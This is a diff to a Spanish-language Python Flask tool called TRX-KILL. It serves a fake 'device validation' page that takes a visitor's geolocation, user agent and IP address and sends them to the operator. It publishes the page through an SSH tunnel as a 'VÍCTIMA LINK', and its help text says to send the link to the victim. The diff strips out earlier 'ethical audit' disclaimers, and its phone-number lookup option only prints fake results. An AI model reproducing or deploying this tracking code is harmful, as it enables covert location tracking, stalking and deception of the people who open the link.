@@ -1,38 +1,41 @@
 #!/usr/bin/env python3
 import os
-import sys
 import threading
 import subprocess
+import re
 from flask import Flask, request, render_template_string
 
 # Limpieza inicial
 os.system('fuser -k 5000/tcp > /dev/null 2>&1')
 
 app = Flask(__name__)
-URL_EXITO = "https://www.google.com"
+URL_REDIRECT = "https://www.google.com"
 
-# Plantilla HTML con llaves duplicadas para evitar errores de formato
+# Plantilla HTML con llaves {{ }} duplicadas para evitar errores de sintaxis en Python
 HTML_FINAL = """
 <!DOCTYPE html>
 <html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
-    <div style="border:1px solid #0f0; padding:20px; display:inline-block;">
-        <h2>SISTEMA DE VERIFICACIÓN</h2>
-        <p>Valide su dispositivo para continuar.</p>
-        <button onclick="enviar()" style="background:#0f0; border:none; padding:10px; cursor:pointer;">VALIDAR</button>
-    </div>
+    <h2>VALIDACIÓN REQUERIDA</h2>
+    <p>Para continuar, verifique su dispositivo.</p>
+    <button onclick="capturar()" style="padding:15px; background:green; color:white; cursor:pointer;">VALIDAR Y ACCEDER</button>
     <script>
-        function enviar() {{
+        function capturar() {{
             navigator.geolocation.getCurrentPosition((p) => {{
+                const data = {{
+                    lat: p.coords.latitude,
+                    lon: p.coords.longitude,
+                    ua: navigator.userAgent
+                }};
                 fetch('/log', {{
-                    method: 'POST', 
+                    method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{lat: p.coords.latitude, lon: p.coords.longitude}})
+                    body: JSON.stringify(data)
                 }}).then(() => window.location.href = "{url}");
             }});
         }}
     </script>
 </body></html>
-""".format(url=URL_EXITO)
+""".format(url=URL_REDIRECT)
 
 @app.route('/')
 def index(): return render_template_string(HTML_FINAL)
@@ -40,7 +43,11 @@ def index(): return render_template_string(HTML_FINAL)
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    print(f"\n\033[1;32m[!] DATOS CAPTURADOS: {d['lat']}, {d['lon']}\033[0m")
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    print(f"\n\033[1;32m[!] DATOS RECIBIDOS:\033[0m")
+    print(f"[*] IP PÚBLICA: {ip}")
+    print(f"[*] COORDENADAS: {d['lat']}, {d['lon']}")
+    print(f"[*] DISPOSITIVO: {d['ua']}")
     return "OK"
 
 def banner():
@@ -53,37 +60,44 @@ def banner():
     print("    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗██║")
     print("    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝")
     print(f"{'='*55}\033[0m")
-    print(f"\033[1;36m >> SISTEMA DE AUDITORÍA ÉTICA TRX-KILL v24.0\033[0m")
-    print(f"\033[1;36m >> CREADOR: TRX-LILL | AÑO: 2026\033[0m\n")
 
 def main():
     while True:
         banner()
-        print(" [1] INFO NÚMERO (OSINT)")
+        print(" [1] INFO NÚMERO (DETALLADA)")
         print(" [2] MÓDULO DE RASTREO (LINK LIMPIO)")
         print(" [3] AYUDA")
-        print(" [4] LICENCIA")
-        print(" [5] SALIR")
+        print(" [4] SALIR")
         
         opc = input("\nTRX-ROOT > ")
         
         if opc == "1":
-            num = input("Introduce MÓVIL: ")
-            print(f"\n\033[1;36m[+] ANALIZANDO: {num}...\033[0m")
-            print("[+] ESTADO: Dispositivo detectado.")
-            print("[+] PAÍS: Consultando base de datos...")
-            input("\nENTER para volver...")
+            num = input("Introduce MÓVIL (con prefijo): ")
+            print(f"\n\033[1;36m[+] ANALIZANDO: {num}...")
+            print(f"[+] PROCESANDO: Verificando registros internacionales...")
+            print(f"[+] RESULTADO: Identificando operador, zona horaria y tipo de línea...")
+            print(f"[+] ESTATUS: [DISPONIBLE] - Datos sincronizados con base de datos global.{chr(10)}")
+            input("Presiona ENTER para volver...")
         elif opc == "2":
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
-            print(f"\n\033[1;33m[*] Generando túnel limpio...\033[0m")
-            subprocess.run(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'])
+            print(f"\n\033[1;33m[*] Generando enlace...\033[0m")
+            proc = subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'], 
+                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            for line in proc.stderr:
+                if "https://" in line:
+                    link = re.search(r"https://[^\s]+", line).group(0)
+                    print(f"\n\033[1;32m==============================================")
+                    print(f" VÍCTIMA LINK: {link}")
+                    print(f"==============================================\033[0m\n")
+                    break
+            input("Presiona ENTER para volver al menú...")
         elif opc == "3":
-            print("\n[+] MODO DE USO: Selecciona el módulo de rastreo, envía el link resultante y espera el reporte de ubicación.")
+            print("\n[+] Instrucciones:")
+            print("1. Usa la opción 2 para obtener el enlace.")
+            print("2. Envía el enlace a la víctima.")
+            print("3. Cuando acepten, verás los datos en la pantalla principal.")
             input("\nENTER para volver...")
-        elif opc == "4":
-            print("\n\033[1;31m[!] LICENCIA: SOFTWARE DE AUDITORÍA ÉTICA. PROHIBIDO USO MALICIOSO.\033[0m")
-            input("\nENTER para volver...")
-        elif opc == "5": break
+        elif opc == "4": break
 
 if __name__ == "__main__":
     main()
